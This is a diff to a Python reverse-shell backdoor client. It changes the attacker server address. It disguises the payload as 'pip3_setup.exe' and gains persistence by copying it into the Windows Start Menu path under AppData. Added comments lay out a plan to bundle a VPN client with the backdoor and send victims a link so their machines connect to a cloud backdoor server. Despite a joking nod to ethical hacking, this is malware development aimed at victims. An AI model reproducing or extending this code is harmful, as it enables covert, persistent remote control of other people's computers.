@@ -14,11 +14,25 @@ import base64
 
 # Global variables
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-# If you're trying to bind your socket to Public IP
-# you're crossing the boundary of Ethical Hacking ;)
+# In reality, you'll need to code a VPN client for your
+# victims to connect to your cloud network as if your
+# victims are in the same network of your Backdoor Server
+
+# Then, send your victims the bundle of VPN+Backdoor Clients
+# When your victims click the link, they're instantly 
+# connected to your Cloud Backdoor Server
+# Then, this Backdoor client is connected as if locally to
+# your Cloud Backdoor Server ;)
+
+# Thus, the IP_ADDRESS in both server.py & reverse_shell.py
+# shall be the localhost IP address 
+# of your Cloud Backdoor Server ;)
+    
+# If you insist performing the captioned procedure, then
+# you'll be crossing the boundary of Ethical Hacking ;)
 # FBI is watching you :D
-IP_ADDRESS = '192.168.31.127'
-#IP_ADDRESS = '127.0.0.1'
+IP_ADDRESS = '192.168.2.16'
+# Your Cloud Backdoor Server should be running server.py all the time
 port = 54321
 
 # Passing 'data' as arg
@@ -151,7 +165,11 @@ def shell():
 # C:\Users\USER\AppData\Roaming is hidden
 # We'll target this directory for our Reverse Shell
 # This will point to whoever user's /AppData
-location = os.environ["appdata"] + "\\pip3.exe"
+#location = os.environ["appdata"] + "\\pip3.exe"
+
+# ============= Gaining persistency
+# A common C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Programs\pip3_setup.exe ;)
+location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\pip3_setup.exe"
 
 # If 'location' does NOT exist, it's 1st time running this Backdoor client
 
@@ -169,7 +187,6 @@ else:
     # Otherwise, just jump to steps below
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     # ==========================================
-    # IP_ADDRESS = '192.168.31.138'
     # port = 54321
     #sock.connect((IP_ADDRESS, port))
     #print(f'Connection Established to Server!')
@@ -179,7 +196,8 @@ else:
     #answer = "Server: Hello Back!"
     #sock.send(answer.encode())
     sock.close()
-    
+# ============= Gaining persistency
+
 # sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 # connection()
 # sock.close()
